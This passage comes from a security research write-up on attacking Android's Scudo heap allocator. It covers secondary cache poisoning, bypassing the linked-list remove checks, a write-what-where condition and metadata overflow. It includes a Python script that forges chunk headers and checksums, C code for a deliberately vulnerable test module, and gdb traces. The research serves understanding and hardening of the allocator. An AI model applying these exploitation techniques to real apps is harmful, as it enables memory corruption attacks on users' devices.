Essentially, `malloc` gets rid of the sign that we would get from `free` if it was not for unsigned subtraction, i.e. from subtracting something big from something small. Then this value is interpreted as an unsigned integer and added to the base address of the chunk id. The following calculations might clarify that:
```
gef➤  p/x 0x7bac69744000 + 0xf86d04890      = base address + shifted compacted pointer
$16 = 0x7bbbf0448890                        = invalid address (reality)
gef➤  p/x 0x7bac69744000 + (int)0xf86d04890 = signed addition!
$17 = 0x7babf0448890                        = wanted address (stack)
```

`malloc` will return the (above malformed) chunk.

If the "malformation" is controllable, then this:
1. can enable memory testing/probing? Not sure how to avoid SIGSEG though...
2. can make arbitrary (accessible) memory regions available to an attacker, if the attacker has information about the process image...

With the above observations, we can infer that the least - significant 36 bits of an address that is supplied to `free`, with the property that this address is less than or equal to the base address of the region containing chunks with id 1, determine the value that is added to the base address. To be precise, only bits **4-35** (excluding bits 0, 1, 2, 3 and everything above 35) are relevant for the addition due to the right and left shifts. As in `malloc` the compacted pointer is shifted to the left by `4` and this shift operation is performed in a 64-bit register, this will result in the addend to be a multiple of `0x10`, which matches the default alignment.

Long story short, if we provided a fake chunk to `free` with an address that is less than the base address of the region that belongs to the respective class id, then the next `malloc` will cause a segmentation fault with high probability.

#### Secondary Cache Poisoning

It is also possible to introduce fake chunks into the secondary. To that end, we have to assume that the secondary is using a cache. Lets see some already familiar [code](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=1118;drc=b45a2ea782074944f79fc388df20b06e01f265f7) to clarify that:
```C++
if (LIKELY(ClassId)) {
    ...
    TSD->Cache.deallocate(ClassId, BlockBegin); // <-- primary free
    ...
} else {
    ...
    Secondary.deallocate(Options, BlockBegin);  // <-- secondary free
}
...
```
As we are interested in the secondary, we can focus on the implementation of [`Secondary::deallocate`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=603):
```C++
template <typename Config>
void MapAllocator<Config>::deallocate(Options Options, void *Ptr) {
    LargeBlock::Header *H = LargeBlock::getHeader<Config>(Ptr);
    const uptr CommitSize = H->CommitSize;
    {
        ScopedLock L(Mutex);
        InUseBlocks.remove(H);  // doubly linked list remove (??unlink??); can abort
        FreedBytes += CommitSize;
        NumberOfFrees++;
        Stats.sub(StatAllocated, CommitSize);
        Stats.sub(StatMapped, H->MapSize);
    }
    Cache.store(Options, H);    // caching or munmap, if enabled; otherwise just munmap
}
```
First of all, [`InUseBlocks`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=476) is a [doubly linked list](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/list.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=139), which contains all allocated secondary chunks. Also, some cache object is used to "free" the chunk. Taking an attacker's perspective, we assume that we can control the entire [`LargeBlock::Header`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=34):
1. `Prev` and `Next` pointers that make the header a part of a doubly linked list.
2. `CommitBase`. Actual starting point of the chunk. Most of the time `CommitBase = MapBase + PageSize`.
3. `CommitSize`. Actual chunk size to be used. Most of the time `CommitSize = 2 * PageSize + RequestedSize`.
4. `MapBase`. Used for `munmap`. What is really returned by `mmap`.
5. `MapSize`. Used for `munmap`. What is really used when using `mmap` to allocate memory.
6. `Data`. Actually `sizeof (Data) = 0`, so we can ignore this!

Now we can start to tamper around with some, if not all, of those fields.

##### Excursion to remove

Anyone, who is familiar with the [unlink exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit), might now scream to investigate [`DoublyLinkedList::remove`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/list.h;l=199;drc=b45a2ea782074944f79fc388df20b06e01f265f7). As we have to pass through this method anyways, we can do a quick analysis:
```C++
// The consistency of the adjacent links is aggressively checked in order to
// catch potential corruption attempts, that could yield a mirrored
// write-{4,8} primitive. nullptr checks are deemed less vital.     <-- I think they know already :(
void remove(T *X) {
    T *Prev = X->Prev;
    T *Next = X->Next;
    if (Prev) {
        CHECK_EQ(Prev->Next, X);
        Prev->Next = Next;
    }
    if (Next) {
        CHECK_EQ(Next->Prev, X);
        Next->Prev = Prev;
    }
    if (First == X) {
        DCHECK_EQ(Prev, nullptr);
        First = Next;
    } else {
        DCHECK_NE(Prev, nullptr);
    }
    if (Last == X) {
        DCHECK_EQ(Next, nullptr);
        Last = Prev;
    } else {
        DCHECK_NE(Next, nullptr);
    }
    Size--;
}
```
Lets formulate two questions of interest:
1. How can we abuse `LargeBlock::Header::Next` and `LargeBlock::Header::Prev` to get a *Write - What - Where* condition?
2. How do we pass through this method without triggering an `abort`, i.e. without failing any of the assertions like `CHECK_EQ(Prev->Next, X)`?

Starting off easy, we can see that choosing `X->Next = X->Prev = 0` will cause execution of `DCHECK_NE(Prev, nullptr)` and `DCHECK_NE(Next, nullptr)`. Observe that `X`, i.e. our fake large header is **not** part of the list. Therefore `First != X` and `Last != X`!

Setting `X->Next = buffer` and `X->Prev = 0` results in a call to `CHECK_EQ(Next->Prev, X)`. Thus, our `buffer` has to contain a pointer that points back to `X`, which seems pretty unlikely, but still possible. Still, as `First != X` and `X->Prev = 0` we abort due to `DCHECK_NE(Prev, nullptr)`.

Finally, `X->Next = buffer_0` and `X->Prev = buffer_1` enforces `buffer_0` and `buffer_1` to contain pointers that point back to `X`.

A trivial way of passing this function is to choose `X->Next = X->Prev = X`. This ensures that `X->Next` and `X->Prev` always point back to `X` with non - zero pointers. Notice that this requires that we know the address of `X`! If this is the case, then `DoublyLinkedList::remove` behaves *almost* like a `nop`, with the side effect that `Size -= 1` per call. (see [future work](#future-work) for more)

Also notice that `Prev->Next` and `Next->Prev` will only be overwritten, if they point back to `X`. As `X` is most likely not part of the `InUseBlocks` list, this implies that we can already write to those locations or we can only write to locations that point back to our buffer. Thus, a *Write - What - Where* condition seems impossible on first analysis.

##### Introducing Fake Chunks to Secondary

The [`AndroidConfig`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/allocator_config.h;l=83) defines the `SecondaryCache` to be of type [`MapAllocatorCache`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=129). Therefore, there is another caching layer to be bypassed / abused.

If [`Cache.store`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=145;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1) cannot cache the chunk that is currently freed, then the chunk will just be unmapped using `munmap`.

If we passed the [`canCache`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=146;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1) check, it should be possible to craft fake chunks for the secondary as well, because of the caching mechanism. To that end, assuming that `canCache(H->CommitSize) == true`, we end up in the following code
```C++
...
if (Config::SecondaryCacheQuarantineSize &&
    useMemoryTagging<Config>(Options)) {
    QuarantinePos =
        (QuarantinePos + 1) % Max(Config::SecondaryCacheQuarantineSize, 1u);
[1]    if (!Quarantine[QuarantinePos].CommitBase) {
        Quarantine[QuarantinePos] = Entry;
        return;
    }
[2]    CachedBlock PrevEntry = Quarantine[QuarantinePos];
    Quarantine[QuarantinePos] = Entry;
    if (OldestTime == 0)
        OldestTime = Entry.Time;
    Entry = PrevEntry;
}
if (EntriesCount >= MaxCount) {
    if (IsFullEvents++ == 4U)
        EmptyCache = true;
} else {
[3]    for (u32 I = 0; I < MaxCount; I++) {
        if (Entries[I].CommitBase)
            continue;
        if (I != 0)
            Entries[I] = Entries[0];
        Entries[0] = Entry;
        EntriesCount++;
        if (OldestTime == 0)
            OldestTime = Entry.Time;
        EntryCached = true;
        break;
    }
}
...
```
Thus there are three interesting paths of execution:
1. No quarantine, i.e. we only run \[3\], which results in our chunks being placed in the cache!
2. Non - full Quarantine, i.e. we run \[1\]. This will place our entry in the quarantine, but not in the cache! Eventually, the chunk will be cached, but it requires a full cycle of `QuarantinePos` for that to happen in this function (maybe there is another function that also increments `QuarantinePos`).
3. Full Quarantine, i.e. we run \[2\]. Therefore, if the quarantine is filled with entries, this function will fetch the next entry from the quarantine, put our chunk into the quarantine and cache the fetched entry.

A trivial attack for that is to fill the quarantine by calling `scudo_free` on a crafted large chunk *that passes all the checks*. Then, after at most `Max(Config::SecondaryCacheQuarantineSize, 1u) + 1` many calls we are guaranteed to have our chunk cached. Afterwards, when calling [`MapAllocator::allocate`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=497;drc=b45a2ea782074944f79fc388df20b06e01f265f7), this will result in [`Cache::retrieve`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=229;drc=b45a2ea782074944f79fc388df20b06e01f265f7) returning the first non - null cache entry, which is, with high probability (ignoring multi-threaded access), our fake chunk. This is similar to [crafting a fake chunk with the primary](#primary-poisoning), although we should not be limited by [decompacting a pointer](#fake-chunk-mispositioning).

It does not seem like there is memory tagging enabled on my system. Therefore, there is no need to bypass the quarantine with the above attack...the fake chunk can be added to the cache directly.

Lets try to craft a fake chunk for the secondary. To that end, lets assume we have the following setup:
```C
#define BUFFER_SIZE 0x100
uint8_t buffer[BUFFER_SIZE] = { 0 };
if (!called) {
    called++;
    jbyteArray ar = (*env)->NewByteArray(env, 8);
    jbyte *leak = (jbyte*)&buffer;
    (*env)->SetByteArrayRegion(env, ar, 0, 8, &leak);
    return ar;
}

uint8_t *raw = (uint8_t*)(*env)->GetByteArrayElements(env, chunk, NULL);
uint32_t length = (*env)->GetArrayLength(env, chunk);
if (raw) {
    memcpy(buffer, raw, (length <= BUFFER_SIZE) ? length : BUFFER_SIZE);

    // Brings attacker - controlled chunk into secondary cache
    free(buffer + 0x30 + 0x10); // large header + combined header

    // Triggers potential write - what - where condition. This could also be triggered by another
    // thread, although it might be problematic what that thread will write and how much...
    uint8_t *write_trigger = malloc(length - 0x40);
    memcpy(write_trigger, raw + 0x40, length - 0x40);
    free(write_trigger);
}
return NULL;
```
On first execution of the above code snippet, the address of `buffer = 0x7babf29407b0` will be leaked. For any other execution, we will try to call `free(buffer + 0x30 + 0x10)` and `malloc(length - 0x40)`. Notice that `length` will be the length of the whole chunk including the headers. When calling `malloc` we have to provide the size of the user data that does not include the headers!

Setting a breakpoint right before `free` yields:
```
gef➤  i r rdi
    rdi            0x7babf29407f0      0x7babf29407f0
gef➤  x/8gx $rdi-0x40
    0x7babf29407b0:	0x00007babf29407b0	0x00007babf29407b0  <--
    0x7babf29407c0:	0x00007babf29407f0	0x0000000000080040    |-- large header
    0x7babf29407d0:	0xffffffffffffffff	0xffffffffffffffff  <--
    0x7babf29407e0:	0xd82d000000000100	0x0000000000000000  <-- combined header + 8 bytes padding
```
Again, if we pass all the checks, i.e. provided a correct large chunk, then the app will **not** abort and not cause a segfault. Also observe that the `LargeBlock::Header::Prev` and `LargeBlock::Header::Next` both point to the beginning of `LargeBlock::Header`. This is because the header has to pass `InUseChunks.remove(H)`.

The header could be crafted in the following way:
```py
# Craft large header
lhdr = large_header()
lhdr.Prev = pointer # ensure that DoublyLinkedList::remove is nop
lhdr.Next = pointer
lhdr.CommitBase = pointer + 0x30 + 0x10 # pointer to user data
lhdr.CommitSize = 0x400 * 0x200 + 0x40 # data + headers
lhdr.MapBase = 0xffffffffffffffff   # irrelevant; for debugging reasons set to -1
lhdr.MapSize = 0xffffffffffffffff   # irrelevant; for debugging reasons set to -1

# Combined header
combined_header = unpacked_header()
combined_header.ClassId = 0 # Secondary allocations have class id 0
combined_header.State = 1   # = allocated
combined_header.SizeOrUnusedBytes = 0   # irrelevant
combined_header.OriginOrWasZeroed = 0   # = malloc'ed chunk
combined_header.Offset = 0  # irrelevant (for now)
combined_header.Checksum = utils.android_crc32(
    cookie,
    pointer + 0x30 + 0x10,  # user data pointer: sizeof (LargeBlock::Header) = 0x30, sizeof (Chunk::UnpackedHeader) = 0x8, 8 bytes padding -> 0x40
    combined_header.pack()
)

# Send chunk
data = b'\x42' * 0x400 * 0x200 # 512KiB to trigger secondary allocation
io.forward(lhdr.bytes() + combined_header.bytes() + p64(0) + data)
```

Notice that [`canCache`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;drc=b45a2ea782074944f79fc388df20b06e01f265f7;l=287) imposes an upper bound on `LargeBlock::Header::CommitSize`, which is [`2 << 20`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/allocator_config.h;l=113;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1). Observe that there is no lower bound to `LargeBlock::Header::CommitSize` that restricts us from introducing a fake chunk into the cache (see [later](#neat-little-side-effect) for more on a lower bound)! (see [future work](#future-work) for an attack idea that abuses the fact that `malloc` calls do not have any control over the size field. This implies that allocations that are in size range of the primary will be taken from the primary. Setting `fake.CommitSize <= <max primary allocation size>` will result in a dead cache entry, because it will be smaller than **any** requested size allocated by the secondary assuming that the primary did not fail to allocate)

Right before calling `malloc(buffer + 0x40)` we have:
```C
gef➤  i r rdi
    rdi            0x80000             0x80000
gef➤  ni
    ...
gef➤  i r rax
    rax            0x7babf2940830      0x7babf2940830
gef➤  x/8gx $rax-0x40
    0x7babf29407f0:	0x00007bac40c76fc0	0x0000000000000000
    0x7babf2940800:	0x00007babf29407f0	0x0000000000080040
    0x7babf2940810:	0xffffffffffffffff	0xffffffffffffffff
    0x7babf2940820:	0x216a000000000100	0x4242424242424242
```

As can be seen from the fields `LargeBlock::Header::MapBase = -1` and `LargeBlock::Header::MapSize = -1`, we definitely get our chunk back. There cannot be any other chunk with such a chunk header, because this would imply that [`mmap`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=542;drc=b45a2ea782074944f79fc388df20b06e01f265f7) returned `-1`, which is not a valid user - space address on Android. Also observe that [the last cached large chunk is retrieved first](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=210;drc=b45a2ea782074944f79fc388df20b06e01f265f7). Hence, if we called `malloc` next, then our fake chunk would be considered first!

Still, there is something off:
1. `LargeBlock::Header::Prev = 0x00007bac40c76fc0`, which is not our chunk.
2. `LargeBlock::Header::Next = 0x0000000000000000`, so its the last element in `InUseChunks`
3. `LargeBlock::Header::CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40`, where `0x7babf29407b0` was the address of the large header before calling `free`. But we can see that the `CommitBase` remained the same and also that the newly "allocated" chunk is now located at `0x00007babf29407f0`, which is the `CommitBase` value of our fake chunk (technically, this could be a coincidence, because `0x7babf29407f0 = 0x7babf29407b0 + 0x40`, which is just shifted by the size of all header altogether including padding. The argument against that is that the secondary by itself should have no reason to return a chunk that is located on the stack, i.e. overlapping with our `buffer`).

As is the case with [primary poisoning](#primary-poisoning), the contents have not been cleared:
```
gef➤  x/4gx $rax
    0x7babf2940830:	0x4242424242424242	0x4242424242424242
    0x7babf2940840:	0x4242424242424242	0x4242424242424242
```
which again allows for distinguishing fake chunk creation and preinitialization of memory. When attempting to preinitialize a data structure, we have to take the shift of `0x40` into account (we will see why the shift is there later).

##### Challenges

Similar to [primary poisoning](#primary-poisoning), there are some pitfalls with [secondary cache poisoning](#secondary-cache-poisoning), which will be discussed in this section.

###### One Secondary to rule 'em all

Observe that when allocating memory from the secondary via [`malloc(<large size>)`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=372;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1), there is only one instance of the secondary that actually handles these allocations (as opposed to the primary, which may "change" depending on the outcome of [`getTSDAndLock`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=356;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1). Actually the primary itself does not change, but the cache that is based on the primary. I will use primary and a cache that comes from the primary interchangably, because the [`Primary`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=992;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1) is not used for any allocations directly).

Considering the empirical observation that the *damnvulnerableapp:VulnerableActivity* averages to roughly 20 threads per run, it is very likely that other threads will also use the secondary. One particular run shows 25 threads running in parallel:
```
gef➤  i threads
    Id   Target Id                            Frame 
    1    Thread 16516.16516 "nerableActivity" 0x00007baef80269aa in __epoll_pwait () from libc.so
    6    Thread 16516.16521 "Signal Catcher"  0x00007baef80263ea in __rt_sigtimedwait () from libc.so
    7    Thread 16516.16522 "perfetto_hprof_" 0x00007baef8025747 in read () from libc.so
    8    Thread 16516.16523 "ADB-JDWP Connec" 0x00007baef8026aaa in __ppoll () from libc.so
    9    Thread 16516.16524 "Jit thread pool" 0x00007baef7fcddf8 in syscall () from libc.so
    10   Thread 16516.16525 "HeapTaskDaemon"  0x00007baef7fcddf8 in syscall () from libc.so
    11   Thread 16516.16526 "ReferenceQueueD" 0x00007baef7fcddf8 in syscall () from libc.so
    12   Thread 16516.16527 "FinalizerDaemon" 0x00007baef7fcddf8 in syscall () from libc.so
    13   Thread 16516.16528 "FinalizerWatchd" 0x00007baef7fcddf8 in syscall () from libc.so
    14   Thread 16516.16529 "Binder:16516_1"  0x00007baef80259e7 in __ioctl () from libc.so
    15   Thread 16516.16530 "Binder:16516_2"  0x00007baef80259e7 in __ioctl () from libc.so
    16   Thread 16516.16533 "Binder:16516_3"  0x00007baef80259e7 in __ioctl () from libc.so
    17   Thread 16516.16538 "Profile Saver"   0x00007baef7fcddf8 in syscall () from libc.so
    18   Thread 16516.16539 "RenderThread"    0x00007baef80269aa in __epoll_pwait () from libc.so
    19   Thread 16516.16542 "pool-2-thread-1" 0x00007baef8026aaa in __ppoll () from libc.so
    20   Thread 16516.16544 "hwuiTask0"       0x00007baef7fcddf8 in syscall () from libc.so
    21   Thread 16516.16545 "hwuiTask1"       0x00007baef7fcddf8 in syscall () from libc.so
    22   Thread 16516.16546 "Binder:16516_3"  0x00007baef7fcddf8 in syscall () from libc.so
    23   Thread 16516.16547 "Thread-3"        0x00007baef802656a in recvfrom () from libc.so
    * 24   Thread 16516.16548 "Thread-2"        0x00007babf33de9ec in Java_com_damnvulnerableapp_vulnerable_modules_SecondaryFakeModule_free () from libSecondaryFakeModule.so
    25   Thread 16516.16562 "Binder:16516_4"  0x00007baef80259e7 in __ioctl () from libc.so
```

As with the [primary](#thievish-threads), our fake chunk may be stolen by another thread, depending on the allocations performed.

Another problem is that if the cache is [full](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=202;drc=b45a2ea782074944f79fc388df20b06e01f265f7) and there are [not "enough" (4) allocations](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=203;drc=b45a2ea782074944f79fc388df20b06e01f265f7) happening to balance out the congestion of the cache, the cache will be [emptied](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=221;drc=b45a2ea782074944f79fc388df20b06e01f265f7). This basically [invalidates all cache entries](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=357;drc=b45a2ea782074944f79fc388df20b06e01f265f7) and [unmaps](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=364;drc=b45a2ea782074944f79fc388df20b06e01f265f7) them. Having `munmap` called on our fake chunk might seem problematic, but it turns out that running `munmap(0x0, 0x1)` returns successfully...Therefore, setting `LargeBlock::Header::MapBase = 0` and `LargeBlock::Header::MapSize = 1` at least prevents the app from aborting. Of course, having our fake cache entry stripped from the cache mitigates this attack. 

To conclude, **Secondary Cache Poisoning is probabilistic** just like [Primary Poisoning](#pitfalls-and-challenges)!

###### Shifted User Data

Recall that our fake chunk returned from calling `malloc` is located at `fake.CommitBase = 0x00007babf29407f0 = 0x7babf29407b0 + 0x40`. Therefore, the user data starts at `0x7babf29407b0 + 0x40 + 0x40 = 0x7babf2940830`, because of the headers and padding (see example above). At best, we want to show that `malloc(size) = fake.CommitBase + 0x40`, because this would allow us to precisely control where the fake chunk is located. Observe that there seem to be no limitations on the position of a secondary chunk as opposed to [primary chunks](#fake-chunk-mispositioning), because the `LargeBlock::Header::CommitBase` is not compacted!

Lets say we successfully called `free(buffer + 0x40)` and therefore introduced our fake chunk into the secondary cache. Also, assume that the next call of our thread to `malloc(fake.CommitSize - 0x40)` returns our fake chunk, if available in terms of size and pointer constraints (no other thread can steal it), and that `0x10 | fake.CommitBase` and `0x10 | fake.CommitSize` (i.e. everything is nicely aligned). We want to prove that these assumptions imply that `malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40`.

First, observe that [`MapAllocatorCache::store`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=145;drc=b45a2ea782074944f79fc388df20b06e01f265f7) does not change `fake.CommitBase` and `fake.CommitSize`. To that end, notice that all accesses to [`Entry.CommitBase`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=155;drc=b45a2ea782074944f79fc388df20b06e01f265f7) and [`Entry.CommitSize`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=156;drc=b45a2ea782074944f79fc388df20b06e01f265f7), are by value and **not** by reference. Thus, the actual cache entry will contain our chosen `fake.CommitBase` and `fake.CommitSize`.

When allocating from the secondary cache, [`retrieve`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=229;drc=b45a2ea782074944f79fc388df20b06e01f265f7) is called. Based on the assumption that `malloc(fake.CommitSize - 0x40)` returns our fake chunk if available, we need to show that
1. the sizes match, s.t. our fake chunk is actually part of the set of chunks that fit our allocation request. Then, by assumption, the fake chunk will be returned.
2. the `CommitBase` is somehow modified by a constant.

For the first point, observe that [`Secondary.deallocate`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=372;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1) is given the allocation size that is passed to `malloc`. Therefore, [`MapAllocatorCache::retrieve`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=514;drc=b45a2ea782074944f79fc388df20b06e01f265f7) is called with `Size = fake.CommitSize - 0x40`. We also know that `fake_entry.CommitSize = fake.CommitSize` (we will call the entry representing our fake chunk `fake_entry`). Hence `CommitBase := fake_entry.CommitBase` and `CommitSize := fake_entry.CommitSize`. Then it has to hold that
1. [`HeaderPos > CommitBase + CommitSize`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=249;drc=b45a2ea782074944f79fc388df20b06e01f265f7). This is computed in the following:
    ```
    AllocPos  = roundDownTo(CommitBase + CommitSize - Size, Alignment)
            = roundDownTo(CommitBase + CommitSize - (fake.CommitSize - 0x40), Alignment)
            = roundDownTo(CommitBase + CommitSize - (CommitSize - 0x40), Alignment)
            = roundDownTo(CommitBase + 0x40), Alignment)   <-- assumption on 0x10 divides CommitBase
            = CommitBase + 0x40
            
    HeaderPos = AllocPos - Chunk::getHeaderSize() - LargeBlock::getHeaderSize();
            = (CommitBase + 0x40) - 0x10 - 0x30
            = CommitBase
    ```
    Therefore, we check whether `CommitBase > CommitBase + CommitSize <=> 0 > CommitSize`, which is impossible, as `CommitSize` is of type [`uptr = uintptr_t`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/internal_defs.h;l=81;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=1;bpt=1). To be precise, an unsigned comparison will be performed, i.e. for `r13 = AllocPos` and `rsi = CommitBase + CommitSize`:
    ```
    0x00007baef7fc0dc6 <+182>:	add    r13,0xffffffffffffffc0   // HeaderPos = AllocPos - 0x40
    0x00007baef7fc0dca <+186>:	cmp    r13,rsi  // CommitBase - (CommitBase + CommitSize) = -CommitSize
    0x00007baef7fc0dcd <+189>:	ja     0x7baef7fc0d80   // jump if CF=0 and ZF=0; we DONT want to jump here
    ```
    For the above, `CF=1` as mathematically `CommitSize >= 0`. Hence, the fake chunk passes the first check.
2. [`HeaderPos < CommitBase || AllocPos > CommitBase + PageSize * MaxUnusedCachePages`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=251;drc=b45a2ea782074944f79fc388df20b06e01f265f7):
    1. `HeaderPos < CommitBase <=> CommitBase < CommitBase` is trivially false.
    2. The second condition requires a bit more math:
        ```
            AllocPos = CommitBase + 0x40
                 > CommitBase + PageSize * MaxUnusedCachePages
        <=> 0x40 > 0x1000 * 4
        ```
        which is trivially false.

From now on we may assume that the fake chunk passed all the above tests, which implies that we reach the [assignment phase](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=261;drc=b45a2ea782074944f79fc388df20b06e01f265f7). Luckily, this phase does not modify `fake_entry.CommitBase` and `fake_entry.CommitSize` at all. Notice that the pointer to the header that `MapAllocatorCache::retrieve` returns is [`HeaderPos`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=261;drc=b45a2ea782074944f79fc388df20b06e01f265f7), i.e. `CommitBase`.

Finally, the user data pointer will be computed [here](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/secondary.h;l=515;drc=b45a2ea782074944f79fc388df20b06e01f265f7) (extremely simplified):
```C++
return H + LargeBlock::getHeaderSize(); // = fake.CommitBase + 0x30
```

This is then used to compute the final user pointer [`Ptr = fake.CommitBase + 0x30 + 0x10`](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/combined.h;l=379) (again extremely simplified, but this is what actually happens when resolving alignment etc.).

Therefore, `malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40` (btw. this is totally a [*Write - What - Where* condition](#neat-little-side-effect)).

##### Neat Little Side Effect

The attentive reader might have noticed that the previous proof, dispite being a mathematical disaster, implies that an attacker can control where the chunk is returned to by setting `fake.CommitBase` accordingly.

Theoretically speaking, let `target_addr` be the address we want to write data to. Also, we assume that the cache is not emptied. If the cache is emptied while the fake chunk is cached, `munmap` will either return an error, which in turn results in an abort, or will unmap a region that is in use, therefore eventually causing a segmentation fault. Thus, the probability of the following attack to succeed decreases with increasing amount of bytes to write!

From `malloc(fake.CommitSize - 0x40) = fake.CommitBase + 0x40` we get that the `LargeBlock::Header` is stored at a chosen `fake.CommitBase`. As we cannot control the contents of `fake.Prev` and `fake.Next`, because they will be overwritten, we have to stick with `fake.MapBase` and `fake.MapSize`. It should also be possible to use the `fake.CommitSize` field, but we will ignore it for now, because it will be modified by a `+ 0x40`, which has to be considered when calling `free` in order to bypass the checks.

Now, choosing `fake.CommitBase = target_addr + offset(LargeBlock::Header::MapBase) = target_addr + 0x20` results in a 16 byte write at `target_addr`. Of course this is limited by the fact that a thread allocating enough memory to trigger the secondary will try to use the allocated memory (otherwise, why would a thread allocate memory at all?). Therefore, this *Write - What - Where* condition is constrained by the fact that whereever we write, consecutive memory is most likely overwritten by the allocating thread.

### Heap - based Meta Data Overflow

Up to this point, we have only seen fake chunk creation for [primary](#primary-poisoning) and [secondary](#secondary-cache-poisoning) and a small [*Write - What - Where* condition](#neat-little-side-effect). Now one might ask: What if there is a buffer overflow into a consecutive chunk?

First, lets agree on focussing on primary allocations. The reason is that secondary allocations will initially be performed via `mmap` and therefore include a portion of randomness as regards their addresses. Of course, the primary also utilizes randomness to especially make heap - based overflows harder. I.e. the primary [shuffles](https://cs.android.com/android/platform/superproject/+/android-12.0.0_r31:external/scudo/standalone/primary64.h;l=388;drc=b45a2ea782074944f79fc388df20b06e01f265f7;bpv=0;bpt=1) the chunks w.r.t. a class id. This means that for some index `i` we get that with high probability `malloc_i(size) != malloc_i+1(size) - (header_size + padding + size) = malloc_i+1(size) - 0x20`.

This leaves us with either trying to attack the randomness (e.g. via side channel attacks) or creating two consecutive fake chunks with the property that one chunk can overflow into the other chunk. As attacks on randomness are pretty hard (i.e. mathematical) this will be postponed and tagged as [future work](#future-work).

Lets assume that we introduced two fake chunks, named `first` and `second`, with the following properties:
1. the fake chunks are of the same size (primary)
2. there exists an index `i` s.t. `C->Chunks[i] = first` and `C->Chunks[i+1] = second`
3. there is no interference by other threads
4. `first` and `second` are successive in memory, i.e. `addr(first) + 0x20 = addr(second)`
5. there exists functionality in the target app that will allocate both chunks, trigger a buffer overflow from `first` into `second`, and `second` contains "important" information

To be precise, it only really matters that property 5 is given, i.e. we technically do not need property 2. Although the problem that arises is that the functionality that triggers the overflow will have to perform a certain (maybe random) amount of allocations after allocating `first` until it allocates `second`, therefore decreasing success probability. Determining the amount of allocations could require restarting the app over and over again with increasing number of allocations, or in the worst case boil down to guessing.

Assuming the above properties, the remaining issue is that overwriting meta data of `second` in *Scudo* will abort the app if `free(second)` is called and there is a checksum mismatch. Therefore, we need to know the pointer of `second` and **a** value for `Cookie` in order to properly compute the checksum. If, however, the goal is to get the overflow into "important" user data (which might even allow to overwrite the `.got` entry of `free`), then an attacker will be allowed to overflow with the above assumptions.

## Future Work

